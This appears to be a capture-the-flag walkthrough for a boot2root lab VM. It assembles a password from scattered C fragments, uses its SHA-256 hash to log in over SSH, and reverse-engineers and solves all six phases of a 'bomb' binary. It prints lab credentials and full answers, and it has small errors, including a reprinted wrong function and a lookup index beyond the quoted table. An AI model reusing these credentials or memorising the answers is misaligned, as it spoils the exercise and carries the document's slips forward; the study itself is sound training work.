	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}
*/
//file750
```


We see this and:

```
int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}
```
From this, we understand that we need to hash the password we obtained from the **`getme`** functions with SHA-256 and connect via SSH.

The output will look something like this = **` MY PASSWORD IS: xxxxx`**

```
luji/mnt/c/Users/Admin/Desktop/ft_fun:grep  "getme" *
0T16C.pcap:char getme4() {
32O0M.pcap:char getme7() {
331ZU.pcap:char getme1() {
4KAOH.pcap:char getme5() {
91CD0.pcap:char getme6() {
B62N4.pcap:char getme3() {
BJPCP.pcap:char getme8() {
BJPCP.pcap:char getme9() {
BJPCP.pcap:char getme10() {
BJPCP.pcap:char getme11() {
BJPCP.pcap:char getme12()
BJPCP.pcap:     printf("%c",getme1());
BJPCP.pcap:     printf("%c",getme2());
BJPCP.pcap:     printf("%c",getme3());
BJPCP.pcap:     printf("%c",getme4());
BJPCP.pcap:     printf("%c",getme5());
BJPCP.pcap:     printf("%c",getme6());
BJPCP.pcap:     printf("%c",getme7());
BJPCP.pcap:     printf("%c",getme8());
BJPCP.pcap:     printf("%c",getme9());
BJPCP.pcap:     printf("%c",getme10());
BJPCP.pcap:     printf("%c",getme11());
BJPCP.pcap:     printf("%c",getme12());
G7Y8I.pcap:char getme2() {
```

```
luji/mnt/c/Users/Admin/Desktop/ft_fun:cat 0T16C.pcap
char getme4() {

//file115
```

Since we know this is source code, we want to examine the next .pcap file.

```
luji/mnt/c/Users/Admin/Desktop/ft_fun:grep file116 *
7DT5Q.pcap://file116
```

```
luji/mnt/c/Users/Admin/Desktop/ft_fun:cat 7DT5Q.pcap
        return 'a';
```

This way we can obtain the values.

```
char getme1() { return 'I'; }
char getme2() { return 'h'; }
char getme3() { return 'e'; }
char getme4() { return 'a'; }
char getme5() { return 'r'; }
char getme6() { return 't'; }
char getme7() { return 'p'; }
char getme8() { return 'w'; }
char getme9() { return 'n'; }
char getme10() { return 'a'; }
char getme11() { return 'g'; }
char getme12() { return 'e'; }
```

When we do this for all **`getme`** functions, we get the result **`Iheartpwnage`**.

Now we need to hash it with SHA-256.

```
luji/mnt/c/Users/Admin/Desktop/ft_fun:echo -n "Iheartpwnage" | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

Or you can do this from any website.

Now we can connect via SSH as laurie.

```laurie : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4```

```
luji~:ssh laurie@192.168.193.128

The authenticity of host '192.168.193.128 (192.168.193.128)' can't be established.
ECDSA key fingerprint is SHA256:d5T03f+nYmKY3NWZAinFBqIMEK1U0if222A1JeR8lYE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.193.128' (ECDSA) to the list of known hosts.
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.193.128's password:
laurie@BornToSecHackMe:~$

```

Now that we're connected as the laurie user, let's see what our new task is.

```
laurie@BornToSecHackMe:~$ ls -la

total 34
drwxr-x--- 3 laurie   laurie   143 Oct 15  2015 .
drwxrwx--x 9 www-data root     126 Oct 13  2015 ..
-rwxr-x--- 1 laurie   laurie     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 laurie   laurie   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 laurie   laurie  3489 Oct 13  2015 .bashrc
-rwxr-x--- 1 laurie   laurie 26943 Oct  8  2015 bomb
drwx------ 2 laurie   laurie    43 Oct 15  2015 .cache
-rwxr-x--- 1 laurie   laurie   675 Oct  8  2015 .profile
-rwxr-x--- 1 laurie   laurie   158 Oct  8  2015 README
-rw------- 1 laurie   laurie   606 Oct 13  2015 .viminfo
```

```
-rwxr-x--- 1 laurie   laurie 26943 Oct  8  2015 bomb
-rwxr-x--- 1 laurie   laurie   158 Oct  8  2015 README
```

```
laurie@BornToSecHackMe:~$ cat README

Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```



So I'm downloading the **`bomb`** file to my computer and will analyze it with Binary Ninja. (You can analyze it with other programs if you prefer.)


```
PS C:\Users\Admin\Desktop> scp -P 22 laurie@192.168.193.128:./bomb bomb
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.193.128's password:
bomb           
```


When we analyze it with Binary Ninja:;

```
080489b0    int32_t main(int32_t argc, char** argv, char** envp)

080489c0        void* const var_28
080489c0        
080489c0        if (argc != 1)
080489d3            if (argc != 2)
08048a1b                printf(format: "Usage: %s [<input_file>]\n", *argv)
08048a25                exit(status: 8)
08048a25                noreturn
08048a25            
080489d8            var_28 = &data_8049620
080489e1            FILE* eax_2 = fopen(filename: argv[1], mode: u"r…")
080489e6            infile = eax_2
080489e6            
080489f0            if (eax_2 == 0)
08048a01                printf(format: "%s: Error: Couldn't open %s\n", *argv, argv[1])
08048a0b                exit(status: 8)
08048a0b                noreturn
080489c0        else
080489c7            infile = stdin
080489c7        
08048a30        initialize_bomb()
08048a3d        printf(format: "Welcome this is my little bomb !…", var_28)
08048a4a        printf(format: "only one life good luck !! Have …")
08048a5b        phase_1(read_line())
08048a60        phase_defused()
08048a6d        printf(format: "Phase 1 defused. How about the n…")
08048a7e        phase_2(read_line())
08048a83        phase_defused()
08048a90        printf(format: "That's number 2.  Keep going!\n")
08048aa1        phase_3(read_line())
08048aa6        phase_defused()
08048ab3        printf(format: "Halfway there!\n")
08048ac4        phase_4(read_line())
08048ac9        phase_defused()
08048ad6        printf(format: "So you got that one.  Try this o…")
08048ae7        phase_5(read_line())
08048aec        phase_defused()
08048af9        printf(format: "Good work!  On to the next...\n")
08048b0a        phase_6(read_line())
08048b0f        phase_defused()
08048b1c        return 0

```

Now let's solve all the phases step by step

```
08048b20    int32_t phase_1(char* arg1)

08048b32        int32_t result = strings_not_equal(arg1, "Public speaking is very easy.")
08048b32        
08048b3c        if (result == 0)
08048b46            return result
08048b46        
08048b3e        explode_bomb()
08048b3e        noreturn
```

```phase1 = "Public speaking is very easy."```


```
08048b48    int32_t phase_2(char* arg1)

08048b5b        int32_t var_1c
08048b5b        read_six_numbers(arg1, &var_1c)
08048b5b        
08048b67        if (var_1c != 1)
08048b69            explode_bomb()
08048b69            noreturn
08048b69        
08048b8c        int32_t result
08048b8c        
08048b8c        for (int32_t i = 1; i s<= 5; i += 1)
08048b79            void var_20
08048b79            result = (i + 1) * *(&var_20 + (i << 2))
08048b79            
08048b81            if ((&var_1c)[i] != result)
08048b83                explode_bomb()
08048b83                noreturn
08048b83        
08048b96        return result
```
In order to better analyse the code here, we asked chatgpt to make the code readable. 
We did not see a problem with this because it does not add anything to our learning.

```
int32_t phase_2(char* arg1) {
    int32_t numbers[6];
    read_six_numbers(arg1, numbers);

    if (numbers[0] != 1) {
        explode_bomb();
    }

    int32_t result = 0;
    for (int32_t i = 1; i <= 5; i++) {
        result = (i + 1) * numbers[i - 1];
        if (numbers[i] != result) {
            explode_bomb();
        }
    }

    return result;
}
```


```
x0 = 1 (first number)

x1 = (1 + 1) * x0 = 2 * 1 = 2

x2 = (2 + 1) * x1 = 3 * 2 = 6

x3 = (3 + 1) * x2 = 4 * 6 = 24

x4 = (4 + 1) * x3 = 5 * 24 = 120

x5 = (5 + 1) * x4 = 6 * 120 = 720
```

```phase2 = 1 2 6 24 120 720```


```
08048b98    int32_t phase_3(char* arg1)

08048bc2        int32_t result_1
08048bc2        char var_9
08048bc2        int32_t var_8
08048bc2        
08048bc2        if (sscanf(s: arg1, format: "%d %c %d", &result_1, &var_9, &var_8) s<= 2)
08048bc4            explode_bomb()
08048bc4            noreturn
08048bc4        
08048bcd        int32_t ebx
08048bcd        
08048bcd        if (result_1 u> 7)
08048c88            ebx.b = 0x78
08048c8a            explode_bomb()
08048c8a            noreturn
08048c8a        
08048bd3        int32_t result = result_1
08048bd3        
08048bd6        switch (result)
08048be0            case 0
08048be0                ebx.b = 0x71
08048be0                
08048be9                if (var_8 != 0x309)
08048bef                    explode_bomb()
08048bef                    noreturn
08048c00            case 1
08048c00                ebx.b = 0x62
08048c00                
08048c09                if (var_8 != 0xd6)
08048c0f                    explode_bomb()
08048c0f                    noreturn
08048c16            case 2
08048c16                ebx.b = 0x62
08048c16                
08048c1f                if (var_8 != 0x2f3)
08048c21                    explode_bomb()
08048c21                    noreturn
08048c28            case 3
08048c28                ebx.b = 0x6b
08048c28                
08048c31                if (var_8 != 0xfb)
08048c33                    explode_bomb()
08048c33                    noreturn
08048c40            case 4
08048c40                ebx.b = 0x6f
08048c40                
08048c49                if (var_8 != 0xa0)
08048c4b                    explode_bomb()
08048c4b                    noreturn
08048c52            case 5
08048c52                ebx.b = 0x74
08048c52                
08048c5b                if (var_8 != 0x1ca)
08048c5d                    explode_bomb()
08048c5d                    noreturn
08048c64            case 6
08048c64                ebx.b = 0x76
08048c64                
08048c6d                if (var_8 != 0x30c)
08048c6f                    explode_bomb()
08048c6f                    noreturn
08048c76            case 7
08048c76                ebx.b = 0x62
08048c76                
08048c7f                if (var_8 != 0x20c)
08048c81                    explode_bomb()
08048c81                    noreturn
08048c81        
08048c92        if (ebx.b == var_9)
08048c9f            return result
08048c9f        
08048c94        explode_bomb()
08048c94        noreturn
```

```
int32_t phase_3(char* arg1) {
    int32_t index, val;
    char letter;

    if (sscanf(arg1, "%d %c %d", &index, &letter, &val) <= 2) {
        explode_bomb();
    }

    if (index > 7) {
        letter = 'x';
        explode_bomb();
    }

    char expected_char;
    int expected_val;

    switch (index) {
        case 0:
            expected_char = 'q';
            expected_val = 0x309;
            break;
        case 1:
            expected_char = 'b';
            expected_val = 0xd6;
            break;
        case 2:
            expected_char = 'b';
            expected_val = 0x2f3;
            break;
        case 3:
            expected_char = 'k';
            expected_val = 0xfb;
            break;
        case 4:
            expected_char = 'o';
            expected_val = 0xa0;
            break;
        case 5:
            expected_char = 't';
            expected_val = 0x1ca;
            break;
        case 6:
            expected_char = 'v';
            expected_val = 0x30c;
            break;
        case 7:
            expected_char = 'b';
            expected_val = 0x20c;
            break;
        default:
            explode_bomb();
    }

    if (val != expected_val || letter != expected_char) {
        explode_bomb();
    }

    return index;
}

```

```
| First    (`result_1`)  | Character (Hex)| Karakter (ASCII) | Last Num  (Decimal) |
|------------------------|----------------|------------------|---------------------|
| 0                      |  0x71`         |  'q'             | 777                 |
| 1                      |  0x62`         |  'b'             | 214                 |
| 2                      |  0x62`         |  'b'             | 755                 |
| 3                      |  0x6b`         |  'k'             | 251                 |
| 4                      |  0x6f`         |  'o'             | 160                 |
| 5                      |  0x74`         |  't'             | 458                 |
| 6                      |  0x76`         |  'v'             | 780                 |
| 7                      |  0x62`         |  'b'             | 524                 |
```

```
- 0 q 777
- 1 b 214
- 2 b 755
- 3 k 251
- 4 o 160
- 5 t 458
- 6 v 780
- 7 b 524
```
```
phase3 = 1 b 214
```




```
08048ce0    int32_t phase_4(char* arg1)
08048d07        int32_t var_8
08048d07        
08048d07        if (sscanf(s: arg1, format: "%d", &var_8) != 1 || var_8 s<= 0)
08048d09            explode_bomb()
08048d09            noreturn
08048d09        
08048d15        int32_t result = func4(var_8)
08048d15        
08048d20        if (result == 0x37)
08048d2a            return result
08048d2a        
08048d22        explode_bomb()
08048d22        noreturn
```

Function fun4

```
08048cae        if (arg1 s<= 1)
08048cd0            return 1
08048cd0        
08048cb7        int32_t eax_1 = func4(arg1 - 1)
08048cca        return func4(arg1 - 2) + eax_1
```

```

int32_t func4(int32_t n) 
{
    if (n <= 1) 
	{
        return 1;
    }
    return func4(n - 1) + func4(n - 2);
}

int32_t phase_4(char* arg1) 
{
    int32_t input;

    if (sscanf(arg1, "%d", &input) != 1 || input <= 0) 
	{
        explode_bomb();
    }

    int32_t result = func4(input);

    if (result == 0x37) { // 0x37 = 55
        return result;
    } else {
        explode_bomb();
    }
}

```
```
func4(0) = 1
func4(1) = 1
func4(2) = func4(1) + func4(0) = 1 + 1 = 2
func4(3) = func4(2) + func4(1) = 2 + 1 = 3
func4(4) = 5
func4(5) = 8
func4(6) = 13
func4(7) = 21
func4(8) = 34
func4(9) = 55  <-- BINGO!
```
```
Result
func4(var_8) == 55 so that var_8 = 9.
```

``` 
phase_4 = 9 
```





```
08048d2c    int32_t phase_5(char* arg1)

08048d46        if (string_length(arg1) != 6)
08048d48            explode_bomb()
08048d48            noreturn
08048d48        
08048d69        void var_c
08048d69        
08048d69        for (char* i = nullptr; i s<= 5; i = &i[1])
08048d57            int32_t eax
08048d57            eax.b = *(i + arg1)
08048d5a            eax.b &= 0xf
08048d5f            eax.b = (*"isrveawhobpnutf")[sx.d(eax.b)]
08048d62            *(i + &var_c) = eax.b
08048d62        
08048d6b        char var_6 = 0
08048d7b        int32_t result = strings_not_equal(&var_c, "giants")
08048d7b        
08048d85        if (result == 0)
08048d94            return result
08048d94        
08048d87        explode_bomb()
08048d87        noreturn
```

```
### Lookup Table
"isrveawhobpnutf"
 0123456789abcdef
```

```
### Character Mapping
For "giants":
- 'g' is at position 15 (0xf)
- 'i' is at position 0 (0x0)
- 'a' is at position 5 (0x5)
- 'n' is at position 11 (0xb)
- 't' is at position 13 (0xd)
- 's' is at position 1 (0x1)

#### How it works:
- 'o' & 0xf = 0xf (15) → 'g'
- 'p' & 0xf = 0x0 (0) → 'i'
- 'e' & 0xf = 0x5 (5) → 'a'
- 'k' & 0xf = 0xb (11) → 'n'
- 'm' & 0xf = 0xd (13) → 't'
- 'q' & 0xf = 0x1 (1) → 's'
```

```phase5 = opekmq```



```
08048d98    int32_t phase_6(char* arg1)

08048d9f        void* esi
08048d9f        void* var_58 = esi
08048db3        void var_1c
08048db3        read_six_numbers(arg1, &var_1c)
08048db3        
08048e00        for (int32_t i = 0; i s<= 5; i += 1)
08048dca            if (*(&var_1c + (i << 2)) - 1 u> 5)
08048dcc                explode_bomb()
08048dcc                noreturn
08048dcc            
08048dd7            for (int32_t j = i + 1; j s<= 5; j += 1)
08048def                if (*((i << 2) + &var_1c) == *(&var_1c + (j << 2)))
08048df1                    explode_bomb()
08048df1                    noreturn
08048df1        
08048e42        int32_t* var_34
08048e42        
08048e42        for (int32_t i_1 = 0; i_1 s<= 5; i_1 += 1)
08048e10            void* esi_3 = &node1
08048e13            int32_t j_1 = 1
08048e18            int32_t eax_5 = i_1 << 2
08048e18            
08048e24            if (1 s< *(eax_5 + &var_1c))
08048e29                esi_3 = &node1
08048e29                
08048e36                do
08048e30                    esi_3 = *(esi_3 + 8)
08048e33                    j_1 += 1
08048e36                while (j_1 s< *(eax_5 + &var_1c))
08048e36            
08048e3b            (&var_34)[i_1] = esi_3
08048e3b        
08048e44        int32_t* esi_4 = var_34
08048e47        int32_t* var_38 = esi_4
08048e47        
08048e5e        for (int32_t i_2 = 1; i_2 s<= 5; i_2 += 1)
08048e52            int32_t* eax_7 = (&var_34)[i_2]
08048e55            esi_4[2] = eax_7
08048e58            esi_4 = eax_7
08048e58        
08048e60        esi_4[2] = 0
08048e6a        int32_t i_3 = 0
08048e6c        int32_t* esi_6 = var_38
08048e85        int32_t result
08048e85        
08048e85        do
08048e73            result = *esi_6
08048e73            
08048e77            if (result s< *esi_6[2])
08048e79                explode_bomb()
08048e79                noreturn
08048e79            
08048e7e            esi_6 = esi_6[2]
08048e81            i_3 += 1
08048e85        while (i_3 s<= 4)
08048e85        
08048e90        return result
```

```
int32_t phase_5(char* arg1) {
    if (string_length(arg1) != 6) {
        explode_bomb();
    }

    char var_c[6];
    for (int i = 0; i <= 5; i++) {
        int32_t eax = arg1[i];
        eax &= 0xf;
        eax = "isrveawhobpnutf"[eax];
        var_c[i] = eax;
    }

    int32_t result = strings_not_equal(var_c, "giants");

    if (result == 0) {
        return result;
    } else {
        explode_bomb();
    }
}

```

```
1. Input Requirements:
   - Must provide 6 numbers
   - Each number must be between 1-6
   - No duplicate numbers allowed

2. Linked List Structure:

	- node1: value = 253, next = node2
	- node2: value = 725, next = node3
	- node3: value = 301, next = node4
	- node4: value = 997, next = node5
	- node5: value = 212, next = node6
	- node6: value = 432, next = null


3. Solution Logic:
   - The input numbers represent the order we want to rearrange the nodes
   - The final arrangement must have values in descending order
   - Target order: 997 > 725 > 432 > 301 > 253 > 212

4. Node Values in Descending Order:
   - 997 (node4)
   - 725 (node2)
   - 432 (node6)
   - 301 (node3)
   - 253 (node1)
   - 212 (node5)
```

```phase6 = 4 2 6 3 1 5```



